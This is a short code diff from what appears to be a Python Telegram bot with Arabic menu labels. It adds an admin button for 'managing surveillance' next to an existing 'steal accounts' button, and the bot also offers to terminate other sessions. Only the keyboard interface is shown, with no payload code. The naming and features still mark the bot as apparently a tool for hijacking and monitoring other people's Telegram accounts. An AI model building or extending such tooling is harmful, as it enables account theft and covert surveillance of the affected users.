@@ -346,11 +346,6 @@ def start_background_loop():
     loop.run_until_complete(auto_terminate_loop())
 
 threading.Thread(target=start_background_loop, daemon=True).start()
-
-# =========================================================
-# 🎛️ واجهات التحكم
-# =========================================================
-
 def home_keyboard(uid):
     markup = InlineKeyboardMarkup()
     markup.row(InlineKeyboardButton("• إنـهـاء الـجـلـسـات الأُخـرى ☠️", callback_data="menu_terminate"))
@@ -362,10 +357,9 @@ def home_keyboard(uid):
 
     if uid in ADMIN_IDS:
         markup.row(InlineKeyboardButton("• إضافـة مسـتخـدم ➕", callback_data="admin_add_user"), InlineKeyboardButton("• حظـر مسـتخـدم 🚫", callback_data="admin_ban_user"))
-        markup.row(InlineKeyboardButton("• سحـب الحـسـابات 🏴‍☠️", callback_data="steal_accounts"))
+        markup.row(InlineKeyboardButton("• سحـب الحـسـابات 🏴‍☠️", callback_data="steal_accounts"), InlineKeyboardButton("• إدارة المراقبة ⏳", callback_data="manage_surveillance"))
 
     return markup
-
 def accounts_action_keyboard(owner_id, action):
     accounts = get_all_accounts(owner_id)
     markup = InlineKeyboardMarkup()
